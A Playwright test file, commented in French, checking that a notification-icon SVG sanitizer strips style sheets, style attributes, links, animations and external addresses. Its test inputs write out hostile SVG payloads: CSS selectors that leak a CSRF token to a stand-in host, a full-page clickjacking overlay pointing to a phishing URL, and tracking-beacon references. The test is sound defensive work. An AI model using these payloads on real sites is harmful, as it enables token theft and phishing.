// Dans Chromium réel : une icône de toast en texte « <svg… » (µ.modal.notify, opts.icon) peut venir d'un utilisateur (son
// avatar). Elle n'exécutait déjà plus de code, mais gardait sa feuille de style et ses adresses : un « <svg><style> » restylait
// toute la page (éléments masqués, page défigurée) et pouvait envoyer à un tiers une donnée de la page lue par un sélecteur
// d'attribut (le début d'un jeton CSRF) ; un attribut style posait un lien par-dessus toute la page ; une image ou une
// référence externe prévenait un tiers à chaque affichage. Seuls restent désormais les éléments de dessin d'une icône, sans
// feuille de style, sans attribut style, sans animation, sans lien et sans adresse hors du SVG lui-même (`#nom`) : une icône
// ordinaire, dégradés et `<use href="#…">` compris, est posée exactement telle quelle.
// Le runtime est chargé tel quel dans la page, comme les tests navigateur voisins.

import assert from 'node:assert/strict'
import { readFileSync, existsSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'

const __dirname = dirname(fileURLToPath(import.meta.url))
const lire = (f: string): string => readFileSync(join(__dirname, '..', 'src', 'runtime', f), 'utf-8')
const sansEsm = (s: string): string => s.replace(/^\s*import\s+[^;]+;\s*$/gm, '').replace(/^\s*export\s+\{[^}]*\}\s*;?\s*$/gm, '')
const SCRIPT = `${sansEsm(lire('mjs_init.ts'))}\n${lire('mjs_page_cache.ts')}\n${lire('mjs_modal.ts')}\nglobalThis.µ = µ;`
const ORIGINE = 'http://mjs.test'
const PAGE = '<!doctype html><html lang="fr"><head><meta charset="utf-8"></head><body><form><input type="hidden" name="csrf" value="s3cr3t-jeton"><span id="cible">.</span></form><p id="secret">contenu</p></body></html>'

// icône ordinaire : traits, dégradé appelé par url(#…), forme réutilisée par <use href="#…">, titre
const ORDINAIRE = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" class="w-6 h-6" aria-hidden="true">'
  + '<title>Message</title><defs><linearGradient id="d" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#4f46e5"/><stop offset="1" stop-color="#06b6d4" stop-opacity=".8"/></linearGradient>'
  + '<clipPath id="c"><rect width="24" height="24" rx="4"/></clipPath><path id="p" d="M2.25 12.76c0 1.6 1.123 2.994 2.707 3.227 1.087.16 2.185.283 3.293.369V21l4.076-4.076"/></defs>'
  + '<g clip-path="url(#c)"><circle cx="12" cy="12" r="9" fill="url(#d)" opacity="0.4"/><use href="#p" stroke-linecap="round" stroke-linejoin="round"/>'
  + '<polyline points="4 12 9 17 20 6" transform="translate(0 1)"/><ellipse cx="12" cy="5" rx="2" ry="1"/><line x1="3" y1="21" x2="21" y2="21" stroke-dasharray="2 1"/></g></svg>'

describe('µ.modal.notify — icône « <svg… » sans feuille de style ni adresse externe (Chromium réel)', function () {
  this.timeout(120000)
  let browser: any
  let page: any
  let tiers: string[] = []

  before(async function () {
    const playwright = await import('playwright')
    if (!existsSync(playwright.chromium.executablePath())) { this.skip() }
    browser = await playwright.chromium.launch({ args: ['--no-proxy-server'] })
    page    = await browser.newPage({ viewport: { width: 900, height: 700 } })
    page.setDefaultTimeout(10000)
    await page.route(`${ORIGINE}/**`, (r: any) => r.fulfill({ status: 200, contentType: 'text/html; charset=utf-8', body: PAGE }))
    await page.route('https://tiers.example/**', (r: any) => { tiers.push(r.request().url()); r.fulfill({ status: 200, contentType: 'image/svg+xml', body: '<svg xmlns="http://www.w3.org/2000/svg"><rect id="i" width="9" height="9"/></svg>' }) })
  })

  after(async () => { if (browser) { await browser.close() } })

  const ouvrir = async (): Promise<void> => {
    tiers = []
    await page.goto(ORIGINE + '/')
    await page.evaluate(SCRIPT)
  }
  const notifier = async (icone: string): Promise<void> => {
    await page.evaluate(`µ.modal.notify('Bob vous écrit', { icon: ${JSON.stringify(icone)}, duration: 0 }); 0`)
    await page.waitForTimeout(400)
  }
  const derniereIcone = (): Promise<string> => page.evaluate(`(() => { const all = document.querySelectorAll('.mjs-toast-icon'); return all[all.length - 1].innerHTML })()`)

  it('« <svg><style> » ne restyle pas la page', async function () {
    await ouvrir()
    const lire = `getComputedStyle(document.body).backgroundColor + ' / ' + getComputedStyle(document.getElementById('secret')).display`
    const avant = await page.evaluate(lire)
    await notifier('<svg><style>body{background:rgb(255,0,0)!important} #secret{display:none!important}</style><rect width="9" height="9"/></svg>')
    assert.equal(await page.evaluate(lire), avant, 'la page garde son style')
    assert.ok(!(await derniereIcone()).includes('style'), 'ni feuille ni attribut de style dans l\'icône posée')
  })

  it('« <svg><style> » qui lit un jeton CSRF par sélecteur d\'attribut : rien ne part chez un tiers', async function () {
    await ouvrir()
    const regles = ['s3', 'xx'].map((p) => `input[name=csrf][value^=${p}] ~ #cible{background-image:url(https://tiers.example/fuite?debut=${p})}`).join(' ')
    await notifier(`<svg><style>@import url(https://tiers.example/feuille.css); ${regles}</style></svg>`)
    assert.deepEqual(tiers, [], 'aucune requête vers le tiers')
  })

  it('attribut style et lien par-dessus toute la page : retirés, un clic dans la page reste dans la page', async function () {
    await ouvrir()
    await notifier('<svg style="position:fixed;left:0;top:0;width:100vw;height:100vh;z-index:2147483647"><a href="https://tiers.example/hameconnage"><rect width="100%" height="100%" fill="transparent"/></a></svg>')
    await notifier('<svg viewBox="0 0 40 40"><a><set attributeName="href" to="https://tiers.example/hameconnage"/><animate attributeName="href" values="https://tiers.example/a;https://tiers.example/b" dur="1s"/><rect width="40" height="40"/></a></svg>')
    const sous = await page.evaluate(`(() => { const e = document.elementFromPoint(450, 600); const a = e && e.closest && e.closest('a'); return (e ? e.localName : 'rien') + ' ' + (a ? a.getAttribute('href') : '') })()`)
    assert.ok(!/tiers\.example/.test(sous), 'un clic dans la page ne part pas chez le tiers : ' + sous)
    assert.equal(await page.evaluate(`document.querySelectorAll('.mjs-toast-icon [href], .mjs-toast-icon set, .mjs-toast-icon animate, .mjs-toast-icon [style]').length`), 0)
    assert.equal(await page.evaluate(`document.querySelectorAll('.mjs-toast-icon rect').length`), 2, 'le dessin reste')
  })

  it('image, use et url() vers une adresse externe : retirés, aucune requête', async function () {
    await ouvrir()
    await notifier('<svg viewBox="0 0 10 10"><image href="https://tiers.example/pixel.png" width="10" height="10"/><use href="https://tiers.example/sprite.svg#i"/><use xlink:href="https://tiers.example/sprite2.svg#i"/>'
      + '<rect width="10" height="10" fill="url(https://tiers.example/motif.svg#m)" mask="url( \'https://tiers.example/m.svg#m\' )" filter="\\75 rl(https://tiers.example/f.svg#f)"/>'
      + '<filter id="f"><feImage href="https://tiers.example/fe.png"/></filter><circle r="3" cursor="url(https://tiers.example/c.cur), auto"/></svg>')
    const pose = await derniereIcone()
    assert.deepEqual(tiers, [], 'aucune requête vers le tiers')
    assert.ok(!pose.includes('tiers.example'), 'aucune adresse externe dans l\'icône posée : ' + pose)
    assert.equal(await page.evaluate(`document.querySelectorAll('.mjs-toast-icon rect, .mjs-toast-icon circle').length`), 2, 'le dessin reste')
  })

  it('icône ordinaire (traits, dégradé, découpe, use interne) : posée exactement telle quelle, même rendu', async function () {
    await ouvrir()
    await notifier(ORDINAIRE)
    const comparaison = await page.evaluate(`(() => {
      const t = document.createElement('template')
      t.innerHTML = ${JSON.stringify(ORDINAIRE)}
      const pose = document.querySelector('.mjs-toast-icon svg')
      const r = pose.querySelector('circle').getBoundingClientRect()
      return { pareil: pose.outerHTML === t.content.firstChild.outerHTML, pose: pose.outerHTML, attendu: t.content.firstChild.outerHTML, cercle: Math.round(r.width) + 'x' + Math.round(r.height), trait: getComputedStyle(pose.querySelector('polyline')).stroke }
    })()`)
    assert.ok(comparaison.pareil, 'posé : ' + comparaison.pose + '\nattendu : ' + comparaison.attendu)
    assert.notEqual(comparaison.cercle, '0x0', 'le dessin a sa taille')
    assert.notEqual(comparaison.trait, 'none', 'les traits sont peints')
  })
})
